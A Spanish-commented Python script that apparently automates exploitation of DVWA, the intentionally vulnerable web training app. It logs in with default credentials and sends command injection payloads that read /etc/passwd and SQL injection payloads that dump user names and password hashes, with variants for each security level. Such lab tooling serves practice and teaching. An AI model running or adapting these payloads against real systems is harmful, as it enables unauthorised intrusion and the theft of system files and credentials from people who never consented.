import requests
from bs4 import BeautifulSoup


def get_csrf_token() -> str:
    """
    Función que obtiene el token CSRF de la página de login de DVWA.
    """
    response = SESSION.get(DVWA_URL + "/login.php")
    soup = BeautifulSoup(response.text, "html.parser")
    return soup.find("input", {"name": "user_token"})["value"]


def login(username: str, password: str, user_token: str) -> bool:
    """
    Función que realiza el login en DVWA.
    """
    response = SESSION.post(DVWA_URL + "/login.php", data={
        "username": username,
        "password": password,
        "Login": "Login",
        "user_token": user_token
    })
    condition = "Login failed" not in response.text
    return condition


def security_level(user_token: str):
    """
    Función que cambia el nivel de seguridad de DVWA.
    """
    while True:
        try:
            level = input("Nivel de seguridad (1-3): ")
            if level.lower() == "exit":
                exit()
            if int(level) in DVWA_SECURITY_LEVELS:
                level = int(level)
                break
        except ValueError:
            pass
        print("Nivel de seguridad incorrecto")
    SESSION.post(DVWA_URL + "/security.php", data={
        "security": DVWA_SECURITY_LEVELS[level],
        "seclev_submit": "Submit",
        "user_token": user_token
    })
    return level


def command_injection(security_level, user_token: str):
    """
    Función que realiza una inyección de comandos en DVWA.
    """
    recomendations = {
        1: "8.8.8.8; cat /etc/passwd",
        2: "8.8.8.8 | cat /etc/passwd",
        3: "8.8.8.8|cat /etc/passwd",
    }
    command = input(
        f"Inyección de comandos (default {DVWA_SECURITY_LEVELS[security_level]}: {recomendations[security_level]}): ")
    command = recomendations[security_level] if not command else command
    print(f"Ejecutando: {command}")
    response = SESSION.post(DVWA_URL + "/vulnerabilities/exec/", data={
        "ip": command,
        "Submit": "Submit",
        "user_token": user_token
    })
    soup = BeautifulSoup(response.text, "html.parser")
    return soup.find("pre").text.strip()


def sql_injection(security_level):
    """
    Función que realiza una inyección SQL en DVWA.
    """
    recommendations = {
        1: "1' OR '1=1",
        2: "1 UNION SELECT user,password FROM users",
        3: "1' UNION SELECT user,password FROM users#",
    }
    sqli = input(
        f"Inyección SQL (default {DVWA_SECURITY_LEVELS[security_level]}: {recommendations[security_level]}): ")
    sqli = recommendations[security_level] if not sqli else sqli
    print(f"Ejecutando SQLi: {recommendations[security_level]}")
    if security_level == 3:
        SESSION.post(DVWA_URL + "/vulnerabilities/sqli/session-input.php", data={
            "id": sqli,
            "Submit": "Submit"
        })
        response = SESSION.get(DVWA_URL + "/vulnerabilities/sqli")
    else:
        response = SESSION.post(DVWA_URL + "/vulnerabilities/sqli/", data={
            "id": sqli,
            "Submit": "Submit"
        })
    soup = BeautifulSoup(response.text, "html.parser")
    pres = soup.find_all("pre")
    return [pre.text.strip() for pre in pres]


def menu(options: dict):
    opcion = None
    while opcion not in options:
        print(f"{' MENÚ ':=^30}")
        for key, value in options.items():
            print(f"{key}. {value}")
        opcion = input("Opción: ")
    return opcion


def main():
    while True:
        opcion = menu({"1": "Inyección de comandos",
                      "2": "Inyección SQL", "3": "Salir"})
        if opcion == "3":
            break
        level = security_level(user_token)
        if opcion == "1":
            result = command_injection(level, user_token)
        elif opcion == "2":
            result = sql_injection(level)
            result = "\n".join(result)
        print("")
        print(f"{' RESULTADOS ':=^80}", result, "="*80, sep="\n")
        print("")


if __name__ == "__main__":
    host = input("DVWA Host: ")
    host = "locahost" if not host else host
    port = input("DVWA Port: ")
    port = "80" if not port else port
    DVWA_URL = f"http://{host}:{port}"
    SESSION = requests.Session()
    DVWA_SECURITY_LEVELS = {
        1: "low",
        2: "medium",
        3: "high"
    }
    user_token = get_csrf_token()
    if not login("admin", "password", user_token):
        print("Login incorrecto")
        exit(1)
    main()
